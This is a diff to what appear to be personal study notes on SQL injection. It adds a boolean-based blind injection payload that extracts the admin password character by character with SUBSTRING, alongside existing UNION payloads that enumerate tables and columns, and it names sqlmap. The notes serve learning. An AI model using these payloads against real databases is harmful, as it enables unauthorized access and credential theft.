@@ -79,3 +79,10 @@ sql injection
       union select 'a', null,null --
       to determine the columns and the tabless names:
       union select table_name, column_name, null from information_schema.columns --
+    Boolean Based SQLI (Blind)
+      substring(string, start, length)
+      SELECT * FROM tracking WHERE trackingId='12373438283' AND
+      SUBSTRING ((SELECT password FROM users WHERE
+      USERNAME='admin'),1,1)='a'--'
+        return false // checks if first letter is a
+  tools: sql map
